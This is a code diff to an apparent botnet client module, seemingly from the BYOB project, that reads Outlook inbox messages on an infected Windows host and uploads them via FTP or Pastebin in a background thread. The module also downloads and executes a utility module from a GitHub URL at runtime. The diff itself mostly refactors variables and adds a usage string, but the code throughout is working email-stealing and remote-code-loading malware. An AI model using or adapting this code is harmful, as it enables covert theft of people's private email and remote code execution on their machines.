@@ -8,6 +8,7 @@ import sys
 import imp
 import json
 import urllib
+import threading
 
 # utilities
 util = imp.new_module('util')
@@ -15,17 +16,22 @@ exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/mas
 sys.modules['util'] = util
 
 # globals
-packages  = ['win32com.client','pythoncom']
+packages = ['win32com.client','pythoncom']
 platforms = ['win32']
-results   = {}
+results = {}
+usage = 'outlook <get/count/search/upload>'
+description = """
+Interact with the Outlook email client application on the client host machine
+"""
 
 # setup
-util.is_compatible(platforms, __name__)
-util.imports(packages, __builtins__)
+if util.is_compatible(platforms, __name__):
+    util.imports(packages, __builtins__)
+else:
+    sys.exit()
 
 # main
 def _get_emails():
-    global results
     pythoncom.CoInitialize()
     outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
     inbox   = outlook.GetDefaultFolder(6)
@@ -41,7 +47,7 @@ def _get_emails():
             message  = email.Body.encode('ascii','ignore')[:100] + '...'
             subject  = email.Subject.encode('ascii','ignore')
             received = str(email.ReceivedTime).replace('/','-').replace('\\','')
-            results[received] = {'from': sender, 'subject': subject, 'message': message}
+            globals()['results'][received] = {'from': sender, 'subject': subject, 'message': message}
         else:
             break
 
@@ -79,14 +85,12 @@ def search(s):
             emails.pop(k,v)
     return json.dumps(emails, indent=2)
 
-
 def count():
     """ 
     Count unread emails in Outlook inbox
     """
-    global results
-    if len(results):
-        result  = len(results)
+    if len(globals()['results']):
+        result  = len(globals()['results'])
     else:
         pythoncom.CoInitialize()
         outlook = win32com.client.Dispatch('Outlook.Application').GetNameSpace('MAPI')
@@ -98,9 +102,8 @@ def upload(args):
     """ 
     Upload emails from Outlook via FTP or Pastebin
     """
-    global results
-    if len(results):
-        output = json.dumps(results, indent=2)
+    if len(globals()['results']):
+        output = json.dumps(globals()['results'], indent=2)
         if mode in ('ftp','pastebin'):
             t = threading.Thread(target=globals()[mode], args=(output,))
             t.daemon = True
